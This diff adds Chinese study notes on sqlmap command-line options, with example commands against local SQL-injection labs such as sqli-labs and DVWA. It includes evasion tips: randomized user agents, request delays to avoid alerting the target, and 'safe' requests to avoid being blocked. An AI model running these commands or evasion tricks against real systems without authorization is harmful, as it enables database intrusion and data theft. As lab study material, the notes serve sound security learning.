@@ -1,0 +1,94 @@
+# 查看版本信息
+python3 sqlmap.py --version
+# sqmap直接连接数据库，探测信息
+# 1.直接连接
+python3 sqlmap.py -d "mysql://root:root@127.0.0.1:3306/mysql" -f --banner --dbs --users
+# 2. sqlmap指定目标URL
+python sqlmap.py -u"http://127.0.0.1/sqlo/less-1/?id=2" --banner
+# 3.sqlmap读取不同文件类型进行SQL注入
+    1.为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图 参数是 -x
+    2.从多行文本格式文件读取多个目标,对多个目标进行探测 参数是 -m
+    python sqlmap.py -m "C:\Users\shelleyfu\Desktop\sqlmap\url.txt" --banner
+    3.可以将一个HTTP请求保存在文件中，然后使用参数 -r
+    python sqlmap.py -r "C:\Users\shelleyfu\Desktop\sqlmap\target.txt" --banner
+    4.从配置文件sqlmap.conf中读取目标探测 参数是 -c
+    python sqlmap.py -c sqlmap.conf
+    文件中的url原本为空，修改为url = http://127.0.0.1/sqli/Less-2/?id=3
+
+# 4. sqlmap设置请求参数
+    1. http方法 默认是get/post 两者的区别
+    python sqlmap.py -u "http://127.0.0.1/sqlo/less-1/?id=2" --banner --vs
+    python sqlmap.py -u "http://127.0.0.1/sqlo/less-1/?id=2" --banner --v 5 --method="put"
+    2. sqlmap设置post提交参数
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-11/index-php" --data="uname=admin&passwd=admin&submit=Submit" --banner   # 在url里面的network的from data
+    3.sqlmap中用来设置cookie的参数   level>=2
+    --cookie
+    Cookie: security=low; PHPSESSID=50os72tr2fgdfbb01o79duod37
+    python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --banner      # 报错
+    python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=50os72tr2fgdfbb01o79duod37" --banner
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-20/index.php" --cookie "uname=admin" --level 2 --banner --users
+    --cookie-del
+    --load-cookies      # 从文件中加载
+    --drop-set-cookie   # 如果有提供set-cookie值
+
+
+4.1 sqlmap使用cookie过程
+    1.登录或浏览页面
+    2.找到cookie
+    3.在sqlmap中使用--cookie cookie值
+
+# 5. sqlmap中用来设置user-agent
+    默认情况下,sqlmap使用以下用户代理执行HTTP请求:sqlmap/1.0-dev-xxxx(http://sqlmap.org)
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-20/index.php" --cookie "uname=admin" --level 2 --banner -v 6
+
+# 6. sqlmap指定user-agent
+    使用参数 --user-agent = '指定的user-agent'
+    # user-agent: sqlmap/1.3.5.128#dev (http://sqlmap.org)
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-20/index.php" --cookie "uname=admin" --level 2 --banner --user-agent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"-v 6
+    # 随机获取ua更安全
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-20/index.php" --cookie "uname=admin" --level2 --banner --random-agent --banner -v5
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-18/index.php" --random-agent --banner       # level不足是不会显示ua的
+
+# 7. sqlmap中用来设置代理
+    1. --proxy
+    设置HTTP代理服务器位置 格式:--proxy http(s)://ip[端口]
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --proxy"http://163.204.240.9:9999" --banner
+    2. --proxy-cred
+    设置HTTP代理服务器认证信息 格式:--proxy-cred user:pwd
+    3. --proxy-file 设置多条代理在文件中
+    4. --ignore-proxy
+    当希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部
+
+8. sqlmap中用来设置延迟
+    参数 --delay 0.5
+    sqlmap探测过程中会发送大量探测Payload到目标,如果默认情况过快的发包速度会导致目标预警。 为了避免这样的情况发生,可以在探测设置sqlmap发包延迟。默认情况下,不设置延迟
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --delay 3 --banner
+
+9. sqlmap中设置超时
+    参数 --timeout 10.5
+    在考虑超时HTTP请求之前,可以指定等待的秒数。有效值是一个浮点数,比如10.5秒。默认是30秒
+
+     python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --timeout 10.5 --banner
+
+10. sqlmap中设置超时重试次数
+    参数 --retries count 4
+    设置对应重试次数,默认情况下重试3次
+
+11. sqlmap中设置随机参数
+    参数 --randomize 参数名称
+    sqlmap可以指定要在每次请求期间随机更改其值得参数名称。长度和类型根据提供的原始值保持 一致
+
+    python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --randomize id --banner
+
+12. sqlmap中设置忽略401
+    如果测试偶尔返回HTTP错误401的站点,而你想忽略它并在不提供适当凭证的情况下继续测试,可以 使用--ignore-401
+    --ignore-401 参数用来忽略未验证错误
+
+13.避免错误请求过多而被屏蔽
+有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错 误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。
+
+参数
+    –-safe-url 隔一会就访问一下的安全URL
+    –-safe-post 访问安全URL时携带的POST数据
+    –-safe-req 从文件中载入安全HTTP请求
+    –-safe-freq 每次测试请求之后都会访问一下的安全URL
